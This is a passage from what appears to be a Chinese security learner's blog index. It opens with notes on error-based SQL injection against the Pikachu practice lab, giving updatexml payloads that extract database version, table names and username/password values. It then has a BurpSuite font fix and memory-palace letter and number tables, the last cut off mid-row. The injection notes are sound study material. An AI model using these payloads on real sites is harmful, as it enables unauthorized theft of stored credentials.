concat(username,0x7e,password) from users limit 0,1))),0)#</code>，反馈如下图所示。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLli/updatexml报错注入同时爆username和password字段值信息.png"></li><li><p>payload：<code>x&#39; and updatexml(0x7e,concat(0x7e,((select concat(username,0x7e,password) from users limit 0,1))),0)#</code></p></li></ul></li></ul><p><strong>解析</strong>：</p><p>拼接的SQL语句为：</p><pre class=" language-mysql"><code class="language-mysql"># 爆数据库版本信息select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#%'# 爆当前用户信息select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,(select user()),0x7e),1)#%'# 爆当前数据库名称信息select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#%'# 爆数据库中表信息select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 3,1),0x7e),1)#%'# 爆数据表中字段名信息select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 1,1),0x7e),1)#%'# 爆数据表中字段值信息select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)#%'# 爆password字段值前16位select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),1,16),0x7e),1)#%'# 爆password字段值后16位select username,id,email from member where username like '%x' and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),17,16),0x7e),1)#%'# 同时爆username和password字段值select username,id,email from member where username like '%x' and updatexml(0x7e,concat(0x7e,((select concat(username,0x7e,password) from users limit 0,1))),0)#%'</code></pre><h1 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h1><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h1 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h1><h1 id="Base64注入"><a href="#Base64注入" class="headerlink" title="Base64注入"></a>Base64注入</h1><h1 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h1>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
            <tag> 安全 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决BurpSuite Response中文乱码</title>
      <link href="/2020/09/05/jie-jue-burpsuite-response-zhong-wen-luan-ma/"/>
      <url>/2020/09/05/jie-jue-burpsuite-response-zhong-wen-luan-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>&emsp;&emsp;在使用BurpSuite的<code>Repeater</code>模块进行注入点判断时，发现<code>Response</code>中的中文简体显示为乱码。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/BurpSuite/ResponseGarbled/Response简体中文显示乱码.png" alt="Response简体中文显示乱码"></center><h1 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h1><ul><li>Windows 10</li><li>Burp Suite Pro_2020.8</li></ul><h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>&emsp;&emsp;出现乱码通常都是由于编码格式产生的。现在计算机的编码格式有许多中，ASCII是一种较早使用的编码格式，随后出现的Big5、UTF系列、GB2312等都属于编码，这么多编码的存在主要是一些历史原因导致的，这与计算机的产生与发展有着密切的联系。这里不做具体介绍，只做简单说明，一个相同的8(16、32)位二进制在不同编码格式中可能显示为不同的符号，若在该编码格式中没有相对应的符号译码时可能以乱码的形式显示。</p><p>&emsp;&emsp;由以上推论可知，此问题产生的原因很有可能是因为Response返回报文的编码和BurpSuite文本显示的编码不兼容导致的。要解决该问题只需要修改BurpSuite显示的编码格式即可。但是主要的问题不在这里。</p><p>&emsp;&emsp;查看<code>Response Header</code>可以看到<code>Content-Type</code>的<code>charset</code>值为<code>UTF-8</code>，而且在<code>BurpSuite</code>的<code>Useroptions</code>的<code>CharacterSets</code>设置为：<code>Recognize automatically based on massage headers</code>，也即显示字符根据消息头中的编码格式决定，UTF-8是可以对中文进行正常译码的，所以这里不是由于字符编码产生的问题。</p><p>&emsp;&emsp;<code>CharacterSets</code>的上一个选项为<code>HTTPMessageDisplay</code>是对HTTP信息的显示进行设置，其中Font用于设置<code>BurpSuite</code>显示的字体样式，默认显示的字体样式支持英文字母，但其不支持中文，所以就在<code>Response</code>中显示了乱码。解决办法很简单，只需要重新设置一个支持中文显示的字体样式即可。</p><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>在打开的<code>BurpSuite</code>中点击【<code>User options</code>】选项，展示【<code>Display</code>】选项卡内容。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/BurpSuite/ResponseGarbled/UserOptions-Display选项卡.png" alt="UserOptions-Display选项卡"></center></li><li><p>设置<code>HTTPMessageDisplay</code>中的<code>Font</code>值为：<code>宋体 11pt</code></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/BurpSuite/ResponseGarbled/UserOptions-设置font值.png" alt="UserOptions-设置font值"></center></li><li><p>完美解决Response中文乱码问题。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/BurpSuite/ResponseGarbled/Response中文正常显示.png" alt="Response中文正常显示"></center></li></ol><h1 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h1><p>&emsp;&emsp;在文本显示时，所依赖的不只是其编码的格式，文本显示字体库也是需要考虑的一方面。例如有的字体库中只包含英文字母、阿拉伯数字、英文符号，当使用这个字体库去显示中文或其他不以英文字母组合的字时，计算机强制执行后得不到我们想要的结果。而在平时我们考虑乱码时通常都是只考虑编码的问题，那时因为你当前使用的字体库可能已经包含中文或其他样式的字符。所以<font color="red">在出现乱码的情况下需要编码和字体两方面结合考虑</font>。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.jianshu.com/p/ef3ce7ad71e8" target="_blank" rel="noopener">实战Burpsuite Response返回中文乱码问题</a></p>]]></content>
      
      
      <categories>
          
          <category> debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编码 </tag>
            
            <tag> BurpSuite </tag>
            
            <tag> 字体 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字母编码系统-动物版</title>
      <link href="/2020/09/02/zi-mu-bian-ma-xi-tong-dong-wu-ban/"/>
      <url>/2020/09/02/zi-mu-bian-ma-xi-tong-dong-wu-ban/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">字母</th><th align="center">编码(汉字)</th><th align="center">编码(英文)</th><th align="center">图像</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">蚂蚁</td><td align="center">ant</td><td align="center"></td></tr><tr><td align="center">B</td><td align="center">鸟</td><td align="center">bird</td><td align="center"></td></tr><tr><td align="center">C</td><td align="center">鸡</td><td align="center">chicken</td><td align="center"></td></tr><tr><td align="center">D</td><td align="center">鹿</td><td align="center">deer</td><td align="center"></td></tr><tr><td align="center">E</td><td align="center">象</td><td align="center">elephant</td><td align="center"></td></tr><tr><td align="center">F</td><td align="center">狐狸</td><td align="center">fox</td><td align="center"></td></tr><tr><td align="center">G</td><td align="center">山羊</td><td align="center">goat</td><td align="center"></td></tr><tr><td align="center">H</td><td align="center">马</td><td align="center">horse</td><td align="center"></td></tr><tr><td align="center">I</td><td align="center">鹮</td><td align="center">ibis</td><td align="center"></td></tr><tr><td align="center">J</td><td align="center">水母</td><td align="center">jellyfish</td><td align="center"></td></tr><tr><td align="center">K</td><td align="center">考拉</td><td align="center">koala</td><td align="center"></td></tr><tr><td align="center">L</td><td align="center">狮子</td><td align="center">lion</td><td align="center"></td></tr><tr><td align="center">M</td><td align="center">猴子</td><td align="center">monkey</td><td align="center"></td></tr><tr><td align="center">N</td><td align="center">夜莺</td><td align="center">nightingale</td><td align="center"></td></tr><tr><td align="center">O</td><td align="center">猫头鹰</td><td align="center">owl</td><td align="center"></td></tr><tr><td align="center">P</td><td align="center">猪</td><td align="center">pig</td><td align="center"></td></tr><tr><td align="center">Q</td><td align="center">蜂王</td><td align="center">queen bee</td><td align="center"></td></tr><tr><td align="center">R</td><td align="center">兔子</td><td align="center">rabbit</td><td align="center"></td></tr><tr><td align="center">S</td><td align="center">蜘蛛</td><td align="center">spider</td><td align="center"></td></tr><tr><td align="center">T</td><td align="center">老虎</td><td align="center">tiger</td><td align="center"></td></tr><tr><td align="center">U</td><td align="center">独角兽</td><td align="center">unicorn</td><td align="center"></td></tr><tr><td align="center">V</td><td align="center">田鼠</td><td align="center">vole</td><td align="center"></td></tr><tr><td align="center">W</td><td align="center">狼</td><td align="center">wolf</td><td align="center"></td></tr><tr><td align="center">X</td><td align="center">北极鸥</td><td align="center">xeme</td><td align="center"></td></tr><tr><td align="center">Y</td><td align="center">牦牛</td><td align="center">yak</td><td align="center"></td></tr><tr><td align="center">Z</td><td align="center">斑马</td><td align="center">zebra</td><td align="center"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 知识宫殿 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字母编码 </tag>
            
            <tag> 编码系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字母编码系统</title>
      <link href="/2020/09/02/zi-mu-bian-ma-xi-tong/"/>
      <url>/2020/09/02/zi-mu-bian-ma-xi-tong/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">字母</th><th align="center">编码</th><th align="center">关联</th><th align="center">图像</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">苹果</td><td align="center">apple</td><td align="center"></td></tr><tr><td align="center">B</td><td align="center">香蕉</td><td align="center">banana</td><td align="center"></td></tr><tr><td align="center">C</td><td align="center">月亮</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">D</td><td align="center">弟弟</td><td align="center">【读音】</td><td align="center"></td></tr><tr><td align="center">E</td><td align="center">鹅</td><td align="center">【读音】</td><td align="center"></td></tr><tr><td align="center">F</td><td align="center">斧头</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">G</td><td align="center">哥哥</td><td align="center">【读音】</td><td align="center"></td></tr><tr><td align="center">H</td><td align="center">椅子</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">I</td><td align="center">蜡烛</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">J</td><td align="center">鱼钩</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">K</td><td align="center">机关枪</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">L</td><td align="center">柠檬</td><td align="center">lemon</td><td align="center"></td></tr><tr><td align="center">M</td><td align="center">麦当劳</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">N</td><td align="center">门</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">O</td><td align="center">橙子</td><td align="center">orange</td><td align="center"></td></tr><tr><td align="center">P</td><td align="center">梨</td><td align="center">pear</td><td align="center"></td></tr><tr><td align="center">Q</td><td align="center">气球</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">R</td><td align="center">小草</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">S</td><td align="center">蛇</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">T</td><td align="center">伞</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">U</td><td align="center">水杯</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">V</td><td align="center">漏斗</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">W</td><td align="center">皇冠</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">X</td><td align="center">剪刀</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">Y</td><td align="center">衣杆</td><td align="center">【形状】</td><td align="center"></td></tr><tr><td align="center">Z</td><td align="center">闪电</td><td align="center">【形状】</td><td align="center"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 知识宫殿 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字母编码 </tag>
            
            <tag> 编码系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字编码系统</title>
      <link href="/2020/09/02/shu-zi-bian-ma-xi-tong/"/>
      <url>/2020/09/02/shu-zi-bian-ma-xi-tong/</url>
      
        <content type="html"><![CDATA[<center><font size="20" weight="100">数字编码系统v1.0</font></center><table><thead><tr><th align="center">数字</th><th align="center">编码方式</th><th align="center">编码</th><th align="center">图片</th></tr></thead><tbody><tr><td align="center">00</td><td align="center">形状</td><td align="center">望远镜</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/00望远镜.png"></td></tr><tr><td align="center">01</td><td align="center">形状：草坪0，树1</td><td align="center">小树</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/01小树.png"></td></tr><tr><td align="center">02</td><td align="center">谐音</td><td align="center">铃儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/02铃儿.png"></td></tr><tr><td align="center">03</td><td align="center">形状：0是凳面，1是凳腿</td><td align="center">三角凳</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/03三角凳.png"></td></tr><tr><td align="center">04</td><td align="center">形状+数量：4个圆轮子</td><td align="center">小汽车</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/04轿车.png"></td></tr><tr><td align="center">05</td><td align="center">形状+数量：5个圆手指</td><td align="center">手套</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/05手套.png"></td></tr><tr><td align="center">06</td><td align="center">形状+数量：6发子弹</td><td align="center">手枪</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/06手枪.png"></td></tr><tr><td align="center">07</td><td align="center">谐音</td><td align="center">令旗</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/07令旗.png"></td></tr><tr><td align="center">08</td><td align="center">形状：8个圆轮子</td><td align="center">溜冰鞋</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/08溜冰鞋.png"></td></tr><tr><td align="center">09</td><td align="center">常识：猫有9条命</td><td align="center">猫</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/09猫.png"></td></tr><tr><td align="center">10</td><td align="center">形状</td><td align="center">棒球</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/10棒球.png"></td></tr><tr><td align="center">11</td><td align="center">形状</td><td align="center">筷子</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/11筷子.png"></td></tr><tr><td align="center">12</td><td align="center">谐音</td><td align="center">椅儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/12椅儿.png"></td></tr><tr><td align="center">13</td><td align="center">谐音</td><td align="center">医生</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/13医生.png"></td></tr><tr><td align="center">14</td><td align="center">谐音</td><td align="center">钥匙</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/14钥匙.png"></td></tr><tr><td align="center">15</td><td align="center">谐音</td><td align="center">鹦鹉</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/15鹦鹉.png"></td></tr><tr><td align="center">16</td><td align="center">谐音</td><td align="center">石榴</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/16石榴.png"></td></tr><tr><td align="center">17</td><td align="center">谐音</td><td align="center">仪器</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/17仪器.png"></td></tr><tr><td align="center">18</td><td align="center">谐音</td><td align="center">腰包</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/18腰包.png"></td></tr><tr><td align="center">19</td><td align="center">谐音</td><td align="center">药酒</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/19药酒.png"></td></tr><tr><td align="center">20</td><td align="center">常识：一盒2支</td><td align="center">香烟</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/20香烟.png"></td></tr><tr><td align="center">21</td><td align="center">谐音</td><td align="center">鳄鱼</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/21鳄鱼.png"></td></tr><tr><td align="center">22</td><td align="center">形状：衣服上有2</td><td align="center">双胞胎</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/22双胞胎.png"></td></tr><tr><td align="center">23</td><td align="center">谐音</td><td align="center">耳塞</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/23耳塞.png"></td></tr><tr><td align="center">24</td><td align="center">常识：一天24小时</td><td align="center">闹钟</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/24闹钟.png"></td></tr><tr><td align="center">25</td><td align="center">谐音</td><td align="center">二胡</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/25二胡.png"></td></tr><tr><td align="center">26</td><td align="center">谐音</td><td align="center">河流</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/26河流.png"></td></tr><tr><td align="center">27</td><td align="center">谐音</td><td align="center">耳机</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/27耳机.png"></td></tr><tr><td align="center">28</td><td align="center">谐音</td><td align="center">恶霸</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/28恶霸.png"></td></tr><tr><td align="center">29</td><td align="center">谐音</td><td align="center">饿囚</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/29饿囚.png"></td></tr><tr><td align="center">30</td><td align="center">谐音</td><td align="center">三轮车</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/30三轮车.png"></td></tr><tr><td align="center">31</td><td align="center">谐音</td><td align="center">鲨鱼</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/31鲨鱼.png"></td></tr><tr><td align="center">32</td><td align="center">谐音</td><td align="center">扇儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/32扇儿.png"></td></tr><tr><td align="center">33</td><td align="center">谐音</td><td align="center">闪闪的星星</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/33星星.png"></td></tr><tr><td align="center">34</td><td align="center">谐音</td><td align="center">三条丝巾</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/34三丝.png"></td></tr><tr><td align="center">35</td><td align="center">谐音</td><td align="center">山虎</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/35山虎.png"></td></tr><tr><td align="center">36</td><td align="center">谐音</td><td align="center">山鹿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/36山鹿.png"></td></tr><tr><td align="center">37</td><td align="center">谐音</td><td align="center">山鸡</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/37山鸡.png"></td></tr><tr><td align="center">38</td><td align="center">节日：妇女节</td><td align="center">妇女</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/38妇女.png"></td></tr><tr><td align="center">39</td><td align="center">谐音</td><td align="center">三九胃泰</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/39三九胃泰.png"></td></tr><tr><td align="center">40</td><td align="center">谐音</td><td align="center">司令</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/40司令.png"></td></tr><tr><td align="center">41</td><td align="center">谐音</td><td align="center">蜥蜴</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/41蜥蜴.png"></td></tr><tr><td align="center">42</td><td align="center">谐音</td><td align="center">柿儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/42柿儿.png"></td></tr><tr><td align="center">43</td><td align="center">谐音</td><td align="center">死神</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/43死神.png"></td></tr><tr><td align="center">44</td><td align="center">蛇“嘶嘶”的声音</td><td align="center">蛇</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/44蛇.png"></td></tr><tr><td align="center">45</td><td align="center">谐音</td><td align="center">师傅</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/45师父.png"></td></tr><tr><td align="center">46</td><td align="center">谐音</td><td align="center">饲料</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/46饲料.png"></td></tr><tr><td align="center">47</td><td align="center">谐音</td><td align="center">司机</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/47司机.png"></td></tr><tr><td align="center">48</td><td align="center">谐音</td><td align="center">石板</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/48石板.png"></td></tr><tr><td align="center">49</td><td align="center">谐音</td><td align="center">湿狗</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/49湿狗.png"></td></tr><tr><td align="center">50</td><td align="center">谐音</td><td align="center">武林</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/50武林.png"></td></tr><tr><td align="center">51</td><td align="center">节日：劳动节</td><td align="center">工人</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/51工人.png"></td></tr><tr><td align="center">52</td><td align="center">谐音</td><td align="center">鼓儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/52鼓儿.png"></td></tr><tr><td align="center">53</td><td align="center">谐音</td><td align="center">乌纱帽</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/53乌纱帽.png"></td></tr><tr><td align="center">54</td><td align="center">节日：青年节</td><td align="center">青年</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/54青年.png"></td></tr><tr><td align="center">55</td><td align="center">谐音：火车“呜呜”的声音</td><td align="center">火车</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/55火车.png"></td></tr><tr><td align="center">56</td><td align="center">谐音</td><td align="center">蜗牛</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/56蜗牛.png"></td></tr><tr><td align="center">57</td><td align="center">谐音</td><td align="center">武器</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/57武器.png"></td></tr><tr><td align="center">58</td><td align="center">谐音</td><td align="center">尾巴</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/58尾巴.png"></td></tr><tr><td align="center">59</td><td align="center">谐音</td><td align="center">蜈蚣</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/59蜈蚣.png"></td></tr><tr><td align="center">60</td><td align="center">谐音</td><td align="center">榴莲</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/60榴莲.png"></td></tr><tr><td align="center">61</td><td align="center">节日：儿童节</td><td align="center">儿童</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/61儿童.png"></td></tr><tr><td align="center">62</td><td align="center">谐音</td><td align="center">牛儿</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/62牛儿.png"></td></tr><tr><td align="center">63</td><td align="center">谐音</td><td align="center">流沙</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/63流沙.png"></td></tr><tr><td align="center">64</td><td align="center">谐音</td><td align="center">螺丝</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/64螺丝.png"></td></tr><tr><td align="center">65</td><td align="center">谐音</td><td align="center">尿壶</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/65尿壶.png"></td></tr><tr><td align="center">66</td><td align="center">谐音</td><td align="center">溜溜球</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/66溜溜球.png"></td></tr><tr><td align="center">67</td><td align="center">谐音</td><td align="center">油漆</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/67油漆.png"></td></tr><tr><td align="center">68</td><td align="center">谐音</td><td align="center">喇叭</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/68喇叭.png"></td></tr><tr><td align="center">69</td><td align="center">谐音</td><td align="center">料酒</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/69料酒.png"></td></tr><tr><td align="center">70</td><td align="center">谐音</td><td align="center">冰淇凌</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/70冰淇淋.png"></td></tr><tr><td align="center">71</td><td align="center">谐音</td><td align="center">鸡翼</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/71鸡翅.png"></td></tr><tr><td align="center">72</td><td align="center">谐音</td><td align="center">企鹅</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/72企鹅.png"></td></tr><tr><td align="center">73</td><td align="center">谐音</td><td align="center">花旗参</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/73花旗参.png"></td></tr><tr><td align="center">74</td><td align="center">谐音</td><td align="center">骑士</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/74骑士.png"></td></tr><tr><td align="center">75</td><td align="center">谐音</td><td align="center">西服</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/75西服.png"></td></tr><tr><td align="center">76</td><td align="center">谐音</td><td align="center">汽油</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/76汽油.png"></td></tr><tr><td align="center">77</td><td align="center">谐音</td><td align="center">机器人</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/77机器人.png"></td></tr><tr><td align="center">78</td><td align="center">谐音</td><td align="center">青蛙</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/78青蛙.png"></td></tr><tr><td align="center">79</td><td align="center">谐音</td><td align="center">气球</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/79气球.png"></td></tr><tr><td align="center">80</td><td align="center">谐音</td><td align="center">巴黎铁塔</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/80巴黎铁塔.png"></td></tr><tr><td align="center">81</td><td align="center">谐音</td><td align="center">白蚁</td><td align="center"><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/KnowledgePalace/DigitalCode/81白蚁.png"></td></tr><tr><td align="center">82</td><td align="center">谐音</td><td 